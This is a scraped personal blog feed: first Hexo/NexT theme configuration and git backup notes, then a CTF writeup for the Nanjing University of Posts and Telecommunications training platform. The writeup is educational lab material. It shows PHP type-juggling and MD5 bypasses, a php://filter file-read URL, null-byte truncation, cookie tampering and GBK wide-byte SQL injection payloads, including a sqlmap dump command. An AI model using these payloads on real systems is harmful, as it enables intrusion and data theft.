Display, available value: # - post expand on posts automatically. Default. # - always expand for all pages automatically # - hide expand only when click on the sidebar toggle icon. # - remove Totally remove sidebar including sidebar toggle. #display: post #display: always display: hide #display: remove # Sidebar offset from top menubar in pixels. offset: 12 offset_float: 12 # Back to top in sidebar b2t: false # Scroll percent label in b2t button scrollpercent: false # Enable sidebar on narrow view onmobile: false# ---------------------------------------------------------------# Post Settings# ---------------------------------------------------------------# Automatically scroll page to section which is under &lt;!-- more --&gt; mark.scroll_to_more: false# Automatically saving scroll position on each post/page in cookies.save_scroll: true# Automatically excerpt description in homepage as preamble text.excerpt_description: true# Automatically Excerpt. Not recommend.# Please use &lt;!-- more --&gt; in the post to control excerpt accurately.auto_excerpt: enable: false length: 150# Post meta display settingspost_meta: item_text: false created_at: true updated_at: true categories: true# Post wordcount display settings# Dependencies: https://github.com/willin/hexo-wordcountpost_wordcount: item_text: false wordcount: true min2read: true totalcount: false separated_meta: false# Wechat Subscriber#wechat_subscriber: #enabled: true #qcode: /path/to/your/wechatqcode ex. /uploads/wechat-qcode.jpg #description: ex. subscribe to my blog by scanning my public wechat account# Reward#reward_comment: Donate comment here#wechatpay: /images/wechatpay.jpg#alipay: /images/alipay.jpg#bitcoin: /images/bitcoin.png# Declare license on postspost_copyright: enable: true license: 署名-非商业性使用-禁止演绎 4.0 国际 license_url: https://creativecommons.org/licenses/by-nc-nd/4.0/ # ---------------------------------------------------------------# Misc Theme Settings# ---------------------------------------------------------------# Reduce padding / margin indents on devices with narrow width.mobile_layout_economy: false# Android Chrome header panel color ($black-deep).android_chrome_color: "#222"# Custom Logo.# !!Only available for Default Scheme currently.# Options:# enabled: [true/false] - Replace with specific image# image: url-of-image - Images's urlcustom_logo: enabled: false image:# Code Highlight theme# Available value:# normal | night | night eighties | night blue | night bright# https://github.com/chriskempson/tomorrow-themehighlight_theme: night bright# ---------------------------------------------------------------# Font Settings# - Find fonts on Google Fonts (https://www.google.com/fonts)# - All fonts set here will have the following styles:# light, light italic, normal, normal italic, bold, bold italic# - Be aware that setting too much fonts will cause site running slowly# - Introduce in 5.0.1# ---------------------------------------------------------------# CAUTION! Safari Version 10.1.2 bug: https://github.com/iissnan/hexo-theme-next/issues/1844# To avoid space between header and sidebar in Pisces / Gemini themes recommended to use Web Safe fonts for `global` (and `logo`):# Arial | Tahoma | Helvetica | Times New Roman | Courier New | Verdana | Georgia | Palatino | Garamond | Comic Sans MS | Trebuchet MS# ---------------------------------------------------------------font: enable: false # Uri of fonts host. E.g. //fonts.googleapis.com (Default). host: # Font options: # `external: true` will load this font family from `host` above. # `family: Times New Roman`. Without any quotes. # `size: xx`. Use `px` as unit. # Global font settings used on &lt;body&gt; element. global: external: true family: Lato size: # Font settings for Headlines (h1, h2, h3, h4, h5, h6). # Fallback to `global` font settings. headings: external: true family: size: # Font settings for posts. # Fallback to `global` font settings. posts: external: true family: # Font settings for Logo. # Fallback to `global` font settings. logo: external: true family: size: # Font settings for &lt;code&gt; and code blocks. codes: external: true family: size:# ---------------------------------------------------------------# Third Party Services Settings# ---------------------------------------------------------------# MathJax Supportmathjax: enable: false per_page: false cdn: //cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML# Han Support docs: https://hanzi.pro/han: false# Swiftype Search API Key#swiftype_key:# Baidu Analytics ID#baidu_analytics: ea32443372f33a0c544614d28ab0a4a0# Duoshuo ShortName#duoshuo_shortname:# Disqusdisqus: enable: false shortname: count: true# Hypercomments#hypercomments_id:# changyanchangyan: enable: false appid: appkey:# Valine.# You can get your appid and appkey from https://leancloud.cn# more info please open https://github.com/xCss/Valinevaline: enable: false appid: # your leancloud application appid appkey: # your leancloud application appkey notify: false # mail notifier , https://github.com/xCss/Valine/wiki verify: false # Verification code placeholder: Comment input placeholder# Support for youyan comments system.# You can get your uid from http://www.uyan.cc#youyan_uid: your uid# Support for LiveRe comments system.# You can get your uid from https://livere.com/insight/myCode (General web site)#livere_uid: your uid# Baidu Share# Available value:# button | slide# Warning: Baidu Share does not support https.#baidushare:## type: button# Share# This plugin is more useful in China, make sure you known how to use it.# And you can find the use guide at official webiste: http://www.jiathis.com/.# Warning: JiaThis does not support https.#jiathis: ##uid: Get this uid from http://www.jiathis.com/#add_this_id:# Share#duoshuo_share: true# Google Webmaster tools verification setting# See: https://www.google.com/webmasters/#google_site_verification:# Google Analytics#google_analytics:# Bing Webmaster tools verification setting# See: https://www.bing.com/webmaster/#bing_site_verification:# Yandex Webmaster tools verification setting# See: https://webmaster.yandex.ru/#yandex_site_verification:# CNZZ count#cnzz_siteid:# Application Insights# See https://azure.microsoft.com/en-us/services/application-insights/# application_insights:# Make duoshuo show UA# user_id must NOT be null when admin_enable is true!# you can visit http://dev.duoshuo.com get duoshuo user id.duoshuo_info: ua_enable: false admin_enable: false user_id: 0 #admin_nickname: Author# Facebook SDK Support.# https://github.com/iissnan/hexo-theme-next/pull/410facebook_sdk: enable: false app_id: #&lt;app_id&gt; fb_admin: #&lt;user_id&gt; like_button: #true webmaster: #true# Facebook comments plugin# This plugin depends on Facebook SDK.# If facebook_sdk.enable is false, Facebook comments plugin is unavailable.facebook_comments_plugin: enable: false num_of_posts: 10 # min posts num is 1 width: 100% # default width is 550px scheme: light # default scheme is light (light or dark)# VKontakte API Support.# To get your AppID visit https://vk.com/editapp?act=createvkontakte_api: enable: false app_id: #&lt;app_id&gt; like: true comments: true num_of_posts: 10# Star rating support to each article.# To get your ID visit https://widgetpack.comrating: enable: false id: #&lt;app_id&gt; color: fc6423# Show number of visitors to each article.# You can visit https://leancloud.cn get AppID and AppKey.leancloud_visitors: enable: false app_id: #&lt;app_id&gt; app_key: #&lt;app_key&gt;# Show PV/UV of the website/page with busuanzi.# Get more information on http://ibruce.info/2015/04/04/busuanzi/busuanzi_count: # count values only if the other configs are false enable: true # custom uv span for the whole site site_uv: true site_uv_header: &lt;i class="fa fa-user"&gt;访问人数&lt;/i&gt; site_uv_footer: # custom pv span for the whole site site_pv: true site_pv_header: &lt;i class="fa fa-eye"&gt;总访问量&lt;/i&gt; site_pv_footer: 次 # custom pv span for one page only page_pv: true page_pv_header: &lt;i class="fa fa-file-o"&gt;&lt;/i&gt; page_pv_footer: views# Tencent analytics ID# tencent_analytics:# Tencent MTA ID# tencent_mta:# Enable baidu push so that the blog will push the url to baidu automatically which is very helpful for SEObaidu_push: true# Google Calendar# Share your recent schedule to others via calendar page## API Documentation:# https://developers.google.com/google-apps/calendar/v3/reference/events/listcalendar: enable: false calendar_id: &lt;required&gt; api_key: &lt;required&gt; orderBy: startTime offsetMax: 24 offsetMin: 4 timeZone: showDeleted: false singleEvents: true maxResults: 250# Algolia Searchalgolia_search: enable: false hits: per_page: 10 labels: input_placeholder: Search for Posts hits_empty: "We didn't find any results for the search: $&#123;query&#125;" hits_stats: "$&#123;hits&#125; results found in $&#123;time&#125; ms"# Local search# Dependencies: https://github.com/flashlab/hexo-generator-searchlocal_search: enable: true # if auto, trigger search by changing input # if manual, trigger search by pressing enter key or search button trigger: auto # show top n results per article, show all results by setting to -1 top_n_per_article: 1# ---------------------------------------------------------------# Tags Settings# ---------------------------------------------------------------# External URL with BASE64 encrypt &amp; decrypt.# Usage: &#123;% exturl text url "title" %&#125;# Alias: &#123;% extlink text url "title" %&#125;exturl: false# Note tag (bs-callout).note: # Note tag style values: # - simple bs-callout old alert style. Default. # - modern bs-callout new (v2-v3) alert style. # - flat flat callout style with background, like on Mozilla or StackOverflow. # - disabled disable all CSS styles import of note tag. style: simple icons: false border_radius: 3 # Offset lighter of background in % for modern and flat styles (modern: -12 | 12; flat: -18 | 6). # Offset also applied to label tag variables. This option can work with disabled note tag. light_bg_offset: 0# Label tag.label: true# Tabs tag.tabs: enable: true transition: tabs: false labels: true border_radius: 0#! ---------------------------------------------------------------#! DO NOT EDIT THE FOLLOWING SETTINGS#! UNLESS YOU KNOW WHAT YOU ARE DOING#! ---------------------------------------------------------------# Motionmotion: enable: false async: true transition: # Transition variants: # fadeIn | fadeOut | flipXIn | flipXOut | flipYIn | flipYOut | flipBounceXIn | flipBounceXOut | flipBounceYIn | flipBounceYOut # swoopIn | swoopOut | whirlIn | whirlOut | shrinkIn | shrinkOut | expandIn | expandOut # bounceIn | bounceOut | bounceUpIn | bounceUpOut | bounceDownIn | bounceDownOut | bounceLeftIn | bounceLeftOut | bounceRightIn | bounceRightOut # slideUpIn | slideUpOut | slideDownIn | slideDownOut | slideLeftIn | slideLeftOut | slideRightIn | slideRightOut # slideUpBigIn | slideUpBigOut | slideDownBigIn | slideDownBigOut | slideLeftBigIn | slideLeftBigOut | slideRightBigIn | slideRightBigOut # perspectiveUpIn | perspectiveUpOut | perspectiveDownIn | perspectiveDownOut | perspectiveLeftIn | perspectiveLeftOut | perspectiveRightIn | perspectiveRightOut post_block: fadeIn post_header: slideDownIn post_body: slideDownIn coll_header: slideLeftIn# Fancyboxfancybox: true# Progress bar in the top during page loading.pace: true# Themes list:#pace-theme-big-counter#pace-theme-bounce#pace-theme-barber-shop#pace-theme-center-atom#pace-theme-center-circle#pace-theme-center-radar#pace-theme-center-simple#pace-theme-corner-indicator#pace-theme-fill-left#pace-theme-flash#pace-theme-loading-bar#pace-theme-mac-osx#pace-theme-minimal# For example# pace_theme: pace-theme-center-simplepace_theme: pace-theme-minimal# Canvas-nestcanvas_nest: false# three_wavesthree_waves: false# canvas_linescanvas_lines: false# canvas_spherecanvas_sphere: false# Only fit scheme Pisces# Canvas-ribboncanvas_ribbon: false# Script Vendors.# Set a CDN address for the vendor you want to customize.# For example# jquery: https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js# Be aware that you should use the same version as internal ones to avoid potential problems.# Please use the https protocol of CDN files when you enable https on your site.vendors: # Internal path prefix. Please do not edit it. _internal: lib # Internal version: 2.1.3 jquery: # Internal version: 2.1.5 # See: http://fancyapps.com/fancybox/ fancybox: fancybox_css: # Internal version: 1.0.6 # See: https://github.com/ftlabs/fastclick fastclick: # Internal version: 1.9.7 # See: https://github.com/tuupola/jquery_lazyload lazyload: # Internal version: 1.2.1 # See: http://VelocityJS.org velocity: # Internal version: 1.2.1 # See: http://VelocityJS.org velocity_ui: # Internal version: 0.7.9 # See: https://faisalman.github.io/ua-parser-js/ ua_parser: # Internal version: 4.6.2 # See: http://fontawesome.io/ fontawesome: # Internal version: 1 # https://www.algolia.com algolia_instant_js: algolia_instant_css: # Internal version: 1.0.2 # See: https://github.com/HubSpot/pace # Or use direct links below: # pace: //cdn.bootcss.com/pace/1.0.2/pace.min.js # pace_css: //cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-flash.min.css pace: pace_css: # Internal version: 1.0.0 # https://github.com/hustcc/canvas-nest.js canvas_nest: # three three: # three_waves # https://github.com/jjandxa/three_waves three_waves: # three_waves # https://github.com/jjandxa/canvas_lines canvas_lines: # three_waves # https://github.com/jjandxa/canvas_sphere canvas_sphere: # Internal version: 1.0.0 # https://github.com/zproo/canvas-ribbon canvas_ribbon: # Internal version: 3.3.0 # https://github.com/ethantw/Han han:# Assetscss: cssjs: jsimages: images# Theme versionversion: 5.1.2 版权声明 ，参考blog\themes\next\layout_macro\post-copyright.swig123456789101112131415161718&lt;ul class="post-copyright"&gt; &lt;li class="post-copyright-title"&gt; &lt;strong&gt;&#123;&#123; __('post.copyright.title') + __('symbol.colon') &#125;&#125;&lt;/strong&gt; &lt;a href="&#123;&#123; post.permalink &#125;&#125;" &gt;&#123;&#123; post.title &#125;&#125;&lt;/a&gt; &lt;/li&gt; &lt;li class="post-copyright-author"&gt; &lt;strong&gt;&#123;&#123; __('post.copyright.author') + __('symbol.colon') &#125;&#125;&lt;/strong&gt; &lt;a href="&#123;&#123;config.url&#125;&#125;" title="&#123;&#123;__('post.copyright.welcome')&#125;&#125;"&gt; &#123;&#123; config.author &#125;&#125;&lt;/a&gt; &lt;/li&gt; &lt;li class="post-copyright-link"&gt; &lt;strong&gt;&#123;&#123; __('post.copyright.link') + __('symbol.colon') &#125;&#125;&lt;/strong&gt; &lt;a href="&#123;&#123; post.permalink &#125;&#125;" title="&#123;&#123; post.title &#125;&#125;"&gt;&#123;&#123; post.permalink &#125;&#125;&lt;/a&gt; &lt;/li&gt; &lt;li class="post-copyright-license"&gt; &lt;strong&gt;&#123;&#123; __('post.copyright.license_title') + __('symbol.colon') &#125;&#125; &lt;/strong&gt; &#123;&#123; __('post.copyright.license_content', theme.post_copyright.license_url, theme.post_copyright.license) &#125;&#125; &lt;/li&gt;&lt;/ul&gt; blog\themes\next\languages\zh-Hans.yml12345678910##部分post: copyright: title: 本文标题 author: 文章作者 link: 原始链接 license_title: 版权声明 welcome: '访问 findneo 的个人博客' license_content: 本文在&lt;i class="fa fa-creative-commons"&gt;&lt;/i&gt; &lt;a href="%s" rel="external nofollow" target="_blank"&gt;%s&lt;/a&gt;下发布。转载请保留原始链接。 文章模板 blog\scaffolds\post.md12345678---title: &#123;&#123; title &#125;&#125;date: &#123;&#123; date &#125;&#125;categories: tags: [] ###可以直接用tags: [tag1,tag2]代替多行tagsdescription: ###当主题配置文件中的excerpt_description开启时，会把这一部分作为文章摘要--- 将博客发布到GitHub page网站内容发布官方文档 123创建GitHub账户，新建username.github.io项目，为git配置sshnpm install hexo-deployer-git --savehexo d 开发内容与配置文件备份由于主题next本身是git项目，所以直接在blog文件夹内git init，然后整个blog文件夹(当然blog/.gitignore已经排除了没用的子文件夹)push到GitHub会发现next文件夹整个是空的。因此要做git库的嵌套处理，但比较麻烦，而且似乎不适用于这种情况。所以最后我采用在第一次push前把blog\themes\next\.git 重命名为 blog\themes\next\now-donot-use.git ，于是blog无法识别到next这个项目，成功地备份了所有配置。将来如果要更新主题，只需重命名回来，然后 git pull ，更新完改回去即可。 本地调试完成后，只需在git bash里执行./ok [&quot;you commit comment&quot;]即可完成部署和配置备份，ok文件内容如下： 12345678910hexo cleanhexo dgit add -Aif [ "$1" = "" ]thengit commit -m "Update."elsegit commit -m "$1"figit push emmm,重装系统了1234567891011121314151617181920212223242526从头开始，安装git fro windows，配置sshgit config --global user.name your_namegit config --global user.email your_mailssh-keygen -t rsa -b 4096 -C "your_email@example.com"clip &lt; ~/.ssh/id_rsa.pubssh -T git@github.com 验证ssh可用-------------------------------------在GitHub新建findneo.github.iogit clone https://github.com/findneo/findneo.github.io.gitcd findneo.github.iogit checkout -b bakeup 新建备份分支并设为默认分支，因为后面只手动操作这个分支，master分支由hexo-deployer-git自动操作 hexo init tmpcp -a tmp/* ./rm -rf tmpnpm install --save hexo-deployer-gitnpm install --save hexo-generator-baidu-sitemapnpm install --save hexo-generator-sitemapnpm install --save hexo-generator-searchdbnpm i --save hexo-wordcount------------------------------------- 在站点配置文件中配置git-deployer为master分支git add . git commit -m "..." git push origin bakeuphexo d -g 参考了这位朋友的备份方法，很棒，(๑•̀ㅂ•́)و✧。 列个软件清单： WSL、everything、 Typora 、shadow socks、chrome、firefox、notepad++ 、一键上网脚本、 sublime、印象笔记、python2/3、git for windows、vmware/kali/win7、AgentRansack、7z、射手影音、SumatraPDF、微软办公系列 WPS Office 2013 个人版 、IObitUninstaller、snipaste burpsuite、fiddler、wireshark、nmap、sqlmap、winhex、ziperello、weevely、winhex、御剑、awvs]]></content>
      <categories>
        <category>备忘</category>
      </categories>
      <tags>
        <tag>hacklife</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[南京邮电大学网络攻防训练平台writeup]]></title>
    <url>%2F2017%2F09%2Fnupt-ctf-writeup%2F</url>
    <content type="text"><![CDATA[南邮CTF平台网址： http://ctf.nuptsast.com/challengesz http://ctf.nuptzj.cn/challenges findneo WEB签到题nctf{flag_admiaanaaaaaaaaaaa} ctrl+u或右键查看源代码即可。在CTF比赛中，代码注释、页面隐藏元素、超链接指向的其他页面、HTTP响应头部都可能隐藏flag或提示信息。在渗透测试中，开发者留下的多余注释和测试页面有时也能提供线索。 md5 collisionnctf{md5_collision_is_easy} 123456789101112&lt;?php$md51 = md5('QNKCDZO');$a = @$_GET['a'];$md52 = @md5($a);if(isset($a))&#123;if ($a != 'QNKCDZO' &amp;&amp; $md51 == $md52) &#123; echo "nctf&#123;*****************&#125;";&#125; else &#123; echo "false!!!";&#125;&#125;else&#123;echo "please input a";&#125;?&gt; 利用PHP弱类型，前人发现md5(‘QNKCDZO’)=’0e830400451993494058024219903391’，md5(‘240610708’)=’0e462097431906509019562988736854’，而因为使用松散比较的缘故，var_dump(‘0e830400451993494058024219903391’==’0e462097431906509019562988736854’);值为真，因此访问 http://chinalover.sinaapp.com/web19/?a=240610708 即可。 1、在PHP中，@被称为错误控制操作符(error control operator)，前置@符号的表达式产生的任何错误都将被忽略。 2、1992年发布的MD5算法是一种广泛使用的哈希算法，最初被设计用来作为加密算法，在被证明不安全后只能用来做数据完整性校验。MD5算法为消息产生128位摘要，常表示为32位十六进制串，由[0-9a-e]组成。 3、PHP的比较操作符主要有两类——松散比较和严格比较，于是就有了equal(==)和Identical(===)两种相等，主要区别在于前者会在比较前根据上下文对操作数进行类型转换(type juggling)而后者不会。这种juggle总的来说利大于弊，但确实容易玩脱。 ​ 此处只谈涉及字符串和数值的松散比较。根据本地实验结合官方文档，我们可以总结出来，这种类型转换的行为关键在于两点，一是判断字符串是否处于数字语境(in a numeric context)，二是如何为处于数字语境的字符串取值。 ​ 当操作符为==时，若有一个操作数为int/float或两个操作数is_numeric()均为真，则判断为处于数字语境；当操作符为数字操作符，如+-/*时，则判断为处于数字语境。（此段为实验支持下的个人猜测，未找到依据。） ​ 根据PHP官方文档 ，如果一个字符串被认定处于数字语境，那么它的取值取决于字符串的前面一部分，如果字符串以有效的数字型数据【Valid numeric data ，正则匹配表达为 \s(\d+\.?\d*|\.\d+)([eE]\d+)?\s，含有[eE]的视为科学计数法】开头，那么字符串取开头部分的数值，否则取0 。实验发现1e也被取值为1而不是0，这有点奇怪 :( 123456789101112131415&lt;?php $a1=1; $b1="1"; $c1="1padding"; $a2=.1; $b2=".1"; $c2=".1padding"; $a3=1.; $b3="1."; $c3="1.padding"; $a4=1.1; $b4="1.1"; $c4="1.1padding"; $a5=1.e1; $b5="1.e1"; $c5="1.e1padding"; $a6=.1e1; $b6=".1e1"; $c6=".1e1padding"; $a7=1.1e1; $b7="1.1e1"; $c7="1.1e1padding"; $a8=1e1; $b8="1e1"; $c8="1e1padding"; var_dump($a8==$b8);//true var_dump($a8==$c8);//true var_dump($b8==$c8);//false var_dump($a8+$b8);//float(20) var_dump($a8+$c8);//float(20) var_dump($b8+$c8);//float(20) 4、其他符合/0[eE]\d{30}/的MD5值： string(strlen($var)) $var string(strlen(md5($var))) md5($var) QNKCDZO 0e830400451993494058024219903391 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s1502113478a 0e861580163291561247404381396064 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s1184209335a 0e072485820392773389523109082030 s1665632922a 0e731198061491163073197128363787 s532378020a 0e220463095855511507588041205815 240610708 0e462097431906509019562988736854 签到2123456789&lt;html&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;尚未登录或口令错误&lt;form action="./index.php" method="post"&gt; &lt;p&gt;输入框：&lt;input type="password" value="" name="text1" maxlength="10"&gt;&lt;br&gt; 请输入口令：zhimakaimen &lt;input type="submit" value="开门"&gt;&lt;/form&gt;&lt;/html&gt; nctf{follow_me_to_exploit} maxlength=”10” 而口令 zhimakaimen 有11位，数据在前端就会被截断掉。这时有两种做法，一种是在chrome/Firefox浏览器的开发者工具中将 maxlength=”10” 字段修改为 maxlength=”11” 或是更大的值；另一种是使用hackbar或burp直接向 http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php post text1=zhimakaimen 。客户端的行为都是可控的，所以熟悉HTML和JavaScript是重要的。 这题不是WEBnctf{photo_can_also_hid3_msg} 下载图片并用winhex打开，在末尾发现字符串。一个简单的隐写。 层层递进nctf{this_is_a_fl4g} 查看源代码，跟随链接，依次访问SO.html -&gt; S0.html-&gt;SO.htm -&gt;S0.htm-&gt;404.html ，在最后一个页面里的注释部分可找到flag。还是查看源代码，细心就会发现异常。 AAencodenctf{javascript_aaencode} aaencode是一种把js代码编码成日语颜文字的编码方式，使用Unicode编码查看，然后 在线解码 。工具作者颇有幽默感。 单身二十年nctf{yougotit_script_now} 访问 http://chinalover.sinaapp.com/web8/search_key.php 会被重定向到 http://chinalover.sinaapp.com/web8/no_key_is_here_forever.php ，重定向会被浏览器自动处理，burp抓包则可见flag。 你从哪里来 你是从 google 来的吗？传送门：题目地址 nctf{http_referer} 给请求加上referer: https://www.google.com即可。从https://github.com/otakekumi/NUPT_Challenges/blob/master/WEB/%E4%BD%A0%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5/index.php 看到源代码可能有点问题。 12345678&lt;?php$referer = $_SERVER['referer'];if ($referer === "https://www.google.com/ " || $referer === "https://www.google.com")&#123; echo "nctf&#123;http_referer&#125;";&#125;else&#123; echo "are you from google?";&#125;?&gt; 第二行应该是$referer = $_SERVER[&#39;HTTP_REFERER&#39;]; ？ php decode123456789&lt;?phpfunction CLsI($ZzvSWE) &#123; $ZzvSWE = gzinflate(base64_decode($ZzvSWE)); for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) &#123; $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1); &#125; return $ZzvSWE;&#125;echo CLsI("+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA=="); nctf{gzip_base64_hhhhhh} 运行代码即可。 文件包含nctf{edulcni_elif_lacol_si_siht} 使用PHP的filter协议读取index.php，即访问 http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/convert.base64-encode/resource=index.php ，将得到的字符串base64解码。 单身一百年也没用nctf{this_is302redirect} flag藏在响应头中。 Download~!nctf{download_any_file_666} 访问 http://way.nuptzj.cn/web6/download.php?url=base64-of-file-name 可以下载允许下载的任意文件，所以先下载download.php，得到白名单列表里有hereiskey.php，再下载下来就可见flag。 COOKIEnctf{cookie_is_different_from_session} 看到响应头中有Set-Cookie: Login=0，因此在请求头加入Cookie: Login=1即可。 MYSQLnctf{query_in_mysql} 根据提示查看robots.txt，内容如下 123456789101112131415TIP:sql.php&lt;?phpif($_GET[id]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id = intval($_GET[id]); $query = @mysql_fetch_array(mysql_query("select content from ctf2 where id='$id'")); if ($_GET[id]==1024) &#123; echo "&lt;p&gt;no! try again&lt;/p&gt;"; &#125; else&#123; echo($query[content]); &#125;&#125;?&gt; 说明要向sql.php提交一个id，使得intval($_GET[id])为1024而$_GET[id]==1024为假。intval识别到非数字的那一位，而松散比较前的强制类型转换会把e当作科学计数法的一部分处理，所以可以提交id=1024e1等，如访问http://chinalover.sinaapp.com/web11/sql.php?id=1024e1。 1、robots.txt可能藏有提示 2、int intval ( mixed $var [, int $base = 10 ] )只取/\d*/的部分。 sql injection 3nctf{gbk_3sqli} 分别访问id=2和id=3得到提示gbk_sql_injection和the fourth table，所以是存在宽字节注入，flag在第四个表里面。上sqlmap跑一跑，最后一步是这样： 1python sqlmap.py -u &quot;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%d6&apos;&quot; -T ctf4 -C flag --dump 也可以手注： 步骤一：确认该点存在注入12345http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2 和http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6%27--+ 返回结果相同。由于MySQL执行查询时会跳过畸形字符，而 id=2%d6%27--+ 经过转义变为id=2%d6%5c%27--+ ，其中%d6%5c被合在一起解释，也就是id = '2Ö'-- 效果等价于 id = '2'--，但我们获得了执行sql的机会。 步骤二：查询数据库名123发现支持union查询 ，http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6%27+and+0+union+select+null,database()--+ ，之所以要加and+0+是因为显示点只有一处，必须让原来的查询失败。得到数据库名为'sae-chinalover'。 步骤三：查询名为’sae-chinalover’的数据库的表的数量和名字123456http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6'+and+0+union+select+null,count(*)+from+information_schema.tables+where+table_schema=database()--+得到目前的数据库含有5张表http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6'+and+0+union+select+null,table_name+from+information_schema.tables+where+table_schema=database()+limit+3,1--+得到第四张表表名为'ctf4'MySQL的information_schema数据库包含所有数据库的元信息，其中的tables表包含其他数据库的数据库名、表名、表类型、创建时间等许多信息，其中table_schema列为数据库名，table_name列为表名。因为能显示出来的记录有限，所以必须用limit来控制要显示第几条记录，否则只能显示第一条。limit用法是这样LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;，必须放在where后面。 步骤四：查询表’ctf4’中的flag1234http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6'+and+0+union+select+null,count(*)+from+ctf4--+发现该表只有一条记录http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6'+and+0+union+select+null,flag+from+ctf4--+猜测列名为flag，查询得到flag 附一个select查询语法 1234567891011121314151617181920212223SELECT [ALL | DISTINCT | DISTINCTROW ] [HIGH_PRIORITY] [STRAIGHT_JOIN] [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] select_expr [, select_expr ...] [FROM table_references [PARTITION partition_list] [WHERE where_condition] [GROUP BY &#123;col_name | expr | position&#125; [ASC | DESC], ... [WITH ROLLUP]] [HAVING where_condition] [ORDER BY &#123;col_name | expr | position&#125; [ASC | DESC], ...] [LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;] [PROCEDURE procedure_name(argument_list)] [INTO OUTFILE 'file_name' [CHARACTER SET charset_name] export_options | INTO DUMPFILE 'file_name' | INTO var_name [, var_name]] [FOR UPDATE | LOCK IN SHARE MODE]] /x00nctf{use00to_jieduan} 访问得到源码 12345678if (isset ($_GET['nctf'])) &#123; if (@ereg ("^[1-9]+$", $_GET['nctf']) === FALSE) echo '必须输入数字才行'; else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE) die('Flag: '.$flag); else echo '骚年，继续努力吧啊~'; &#125; 要求提交的nctf的值符合正则匹配(一个或多个数字)并且能被strpos找到#biubiubiu ，根据提示查到资料ereg会把null视为字符串的结束，从而被%00截断，而strpos则可以越过%00，所以提交nctf=1%00%23biubiubiu即可。 参考资料 由于在PHP中string的实现本质上是一个以字节为单位的数组加上一个声明缓冲区长度的整形，因此string类型可以由任何值构成，即使是“NUL bytes”，但PHP中有些底层库（比如C语言相关的，因为C语言中\0标识字符串的结束）会忽略”a NUL byte”后面的数据，使用了这些库的函数就是非二进制安全的(non-binary-safe)，ereg就是一个例子。闲着无聊搜了一下发现还有这么一些函数： int strcoll ( string $str1 , string $str2 )Locale based string comparison (when current locale is not C or POSIX) public array TokyoTyrantTable::get ( mixed $keys )Gets a row from table database. (version&gt;0.3.0) public Exception::__construct ([ string $message = “” [, int $code = 0 [, Throwable $previous = NULL ]]] )Construct the exception 。其中对message的处理是非二进制安全的。 public Error::__construct ([ string $message = “” [, int $code = 0 [, Throwable $previous = NULL ]]] )Construct the error object 。其中对message的处理是非二进制安全的。 bool error_log ( string $message [, int $message_type = 0 [, string $destination [, string $extra_headers ]]] )Sends an error message to the web server’s error log or to a file.。其中对message的处理是非二进制安全的。(error_log() is not binary safe. message will be truncated by null character.) bool radius_put_string ( resource $radius_handle , int $type , string $value [, int $options = 0 [, int $tag ]] )Attaches a string attribute。 其中$value值基于会被null截断的底层库，是非二进制安全的。 bool radius_put_vendor_string ( resource $radius_handle , int $vendor , int $type , string $value [, int $options = 0 [, int $tag ]] )Attaches a vendor specific string attribute 。$value是非二进制安全的。 string addcslashes ( string $str , string $charlist ) （存疑，似乎并不是）Quote string with slashes in a C style. Returns a string with backslashes before characters that are listed in charlist parameter. array gzfile ( string $filename [, int $use_include_path = 0 ] ) （存疑，待验证）Read entire gz-file into an array 还有这些 1234567891011121314151617&lt;?php$s=$_REQUEST['a']; // http://localhost/test.php?a=asd%00asdf$p='asdf';var_dump(ereg_replace($p,'abcc',$s)); //string(3) "asd" var_dump(eregi_replace($p,'abcc',$s));//string(3) "asd" var_dump(ereg($p,$s));//bool(false) var_dump(eregi($p,$s));//bool(false) var_dump(split($p,$s));//array(1) &#123; [0]=&gt; string(8) "asd\0asdf" &#125; var_dump(split($p,$s));//array(1) &#123; [0]=&gt; string(8) "asd\0asdf" &#125; var_dump(sql_regcase($s)); //看起来没问题啊。。。string(29) "[Aa][Ss][Dd]\0[Aa][Ss][Dd][Ff]" // ereg_replace — Replace regular expression// ereg — Regular expression match// eregi_replace — Replace regular expression case insensitive// eregi — Case insensitive regular expression match// split — Split string into array by regular expression// spliti — Split string into array by regular expression case insensitive// sql_regcase — Make regular expression for case insensitive match bypass againnctf{php_is_so_cool} 访问得到源码 1234567if (isset($_GET['a']) and isset($_GET['b'])) &#123;if ($_GET['a'] != $_GET['b'])if (md5($_GET['a']) === md5($_GET['b']))die('Flag: '.$flag);elseprint 'Wrong.';&#125; 源码要求提交两个不相等的值使他们的md5值严格相等。md5()函数要求接收一个字符串，若传递进去一个数组，则会返回null，即var_dump(md5(array(2))===null);值为bool(true) ，因此向$_GET数组传入两个名为a、b的不相等的数组，从而导致md5()均返回空，于是得到flag，如访问 